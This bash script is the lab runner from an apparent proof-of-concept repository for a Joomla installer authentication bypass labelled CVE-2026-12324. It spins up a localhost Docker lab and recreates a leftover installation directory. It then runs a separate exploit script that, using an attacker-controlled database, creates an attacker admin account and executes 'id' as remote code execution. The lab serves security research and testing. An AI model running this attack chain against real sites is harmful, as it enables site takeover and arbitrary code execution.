#!/usr/bin/env bash
set -Eeuo pipefail

if [[ -t 1 && -z "${NO_COLOR:-}" ]]; then
  C_RESET=$'\033[0m'; C_BOLD=$'\033[1m'; C_DIM=$'\033[2m'
  C_RED=$'\033[91m'; C_GREEN=$'\033[92m'; C_CYAN=$'\033[96m'; C_MAGENTA=$'\033[95m'
else
  C_RESET=; C_BOLD=; C_DIM=; C_RED=; C_GREEN=; C_CYAN=; C_MAGENTA=
fi

info() { echo "${C_CYAN}[*]${C_RESET} $*"; }
ok()   { echo "${C_GREEN}[+]${C_RESET} $*"; }
err()  { echo "${C_RED}[-]${C_RESET} $*" >&2; }

BANNER=(
  " ██████╗██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗  ██████╗"
  "██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗██╔════╝"
  "██║     ██║   ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝███████╗"
  "██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝ ██╔═══██╗"
  "╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗╚██████╔╝"
  " ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝ ╚═════╝"
  " ██╗██████╗ ██████╗ ██████╗  ██╗██╗  ██╗"
  "███║╚════██╗╚════██╗╚════██╗███║██║  ██║"
  "╚██║ █████╔╝ █████╔╝ █████╔╝╚██║███████║"
  " ██║██╔═══╝  ╚═══██╗██╔═══╝  ██║╚════██║"
  " ██║███████╗██████╔╝███████╗ ██║     ██║"
  " ╚═╝╚══════╝╚═════╝ ╚══════╝ ╚═╝     ╚═╝"
)
for line in "${BANNER[@]}"; do
  printf '%s\n' "${C_CYAN}${C_BOLD}${line}${C_RESET}"
done
printf '%s\n' \
  "${C_BOLD}  Joomla! CMS web installer auth bypass${C_RESET}" \
  "${C_MAGENTA}  local lab: leftover installation/ → takeover → RCE${C_RESET}" \
  "${C_DIM}  PoC by Dhairya Shukla · Cấn Quang Hiếu · Vedant Shinde ·${C_RESET}" \
  "${C_DIM}         Adham Mohammed Abd Al-Kawi · Tilaksingh Rana${C_RESET}" \
  ""

# Bring up a disposable localhost Joomla lab, install it, recreate the
# "leftover installation directory" state, and run the standalone exploit
# against it with the harmless `id` command.
#
# The lab relies on JOOMLA_INSTALLATION_DISABLE_LOCALHOST_CHECK=1 (set by the
# official image and declared in compose.yml). See README.md -> Scope.

LAB_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
REPO_DIR="$(cd -- "$LAB_DIR/.." && pwd)"
COMPOSE_FILE="$LAB_DIR/compose.yml"
EXPLOIT="$REPO_DIR/exploit/poc_unauth_rce.py"
POC_PROJECT="${POC_PROJECT:-joomla-poc-$(date +%Y%m%d%H%M%S)-$$}"

if [[ -z "${POC_PORT:-}" ]]; then
  POC_PORT="$(python3 - <<'PY'
import socket
with socket.socket() as sock:
    sock.bind(("127.0.0.1", 0))
    print(sock.getsockname()[1])
PY
)"
fi

for command in docker python3 curl; do
  command -v "$command" >/dev/null || { echo "Missing required command: $command" >&2; exit 1; }
done
docker compose version >/dev/null
python3 -m venv --help >/dev/null

compose() {
  JOOMLA_HOST_PORT="$POC_PORT" docker compose -p "$POC_PROJECT" -f "$COMPOSE_FILE" "$@"
}

info "Compose project: $POC_PROJECT"
info "Local URL: http://127.0.0.1:$POC_PORT"
compose up -d

db_id="$(compose ps -q db)"
attacker_db_id="$(compose ps -q attacker-db)"
if [[ -z "$db_id" || -z "$attacker_db_id" ]]; then
  err "Compose did not create both database containers"
  exit 1
fi

for _ in $(seq 1 90); do
  db_health="$(docker inspect "$db_id" --format '{{.State.Health.Status}}' 2>/dev/null || true)"
  attacker_db_health="$(docker inspect "$attacker_db_id" --format '{{.State.Health.Status}}' 2>/dev/null || true)"
  if [[ "$db_health" == healthy && "$attacker_db_health" == healthy ]]; then
    break
  fi
  sleep 2
done
if [[ "$db_health" != healthy || "$attacker_db_health" != healthy ]]; then
  compose ps
  err "MariaDB did not become healthy; see: docker compose -p '$POC_PROJECT' -f '$COMPOSE_FILE' logs"
  exit 1
fi

for _ in $(seq 1 60); do
  if compose exec -T joomla test -f /var/www/html/installation/joomla.php >/dev/null 2>&1; then
    break
  fi
  sleep 2
done
compose exec -T joomla test -f /var/www/html/installation/joomla.php

# Install from the web-root copy. installation/includes/defines.php derives
# JPATH_ROOT from the script's own directory, so /usr/src/... would install
# into the pristine source tree and delete the copy we need for the restore.
info "Installing the baseline site with Joomla's CLI installer (as www-data)"
compose exec -T -u www-data joomla php /var/www/html/installation/joomla.php install \
  --site-name="Local Security Research Lab" \
  --admin-user="Lab Administrator" \
  --admin-username=labadmin \
  --admin-password='LocalLabAdmin123!' \
  --admin-email=lab-admin@localhost.invalid \
  --db-type=mysqli \
  --db-host=db \
  --db-user=joomla \
  --db-pass=joomla-lab-password \
  --db-name=joomla \
  --db-prefix=lab_ \
  --no-interaction

info "Recreating the leftover-installer state"
compose exec -T joomla sh -lc \
  'cp -a /usr/src/joomla/installation /var/www/html/installation &&
   chown -R www-data:www-data /var/www/html'

compose exec -T -u www-data joomla sh -lc \
  'test -s /var/www/html/configuration.php &&
   test -f /var/www/html/installation/index.php &&
   test -w /var/www/html/configuration.php'

curl --fail --silent --show-error -o /dev/null \
  "http://127.0.0.1:$POC_PORT/installation/index.php"

db_ip="$(docker inspect "$attacker_db_id" --format '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}')"
if [[ -z "$db_ip" ]]; then
  err "Could not resolve the private attacker-db container address"
  exit 1
fi

venv="${TMPDIR:-/tmp}/${POC_PROJECT}-venv"
python3 -m venv "$venv"
"$venv/bin/python" -m pip --quiet install requests

info "Running the standalone exploit against the lab"
"$venv/bin/python" "$EXPLOIT" "http://127.0.0.1:$POC_PORT" --exploit \
  --db "$db_ip:3306" \
  --db-user pwn --db-pass pwn-lab-password --db-name pwn --db-prefix pwn_ \
  --admin-user attacker --admin-pass 'AttackerPass123!' \
  --cmd id --yes

ok "Lab remains running for inspection."
info "To stop containers without deleting data:"
echo "    docker compose -p '$POC_PROJECT' -f '$COMPOSE_FILE' down"
info "Project: $POC_PROJECT | Port: $POC_PORT"
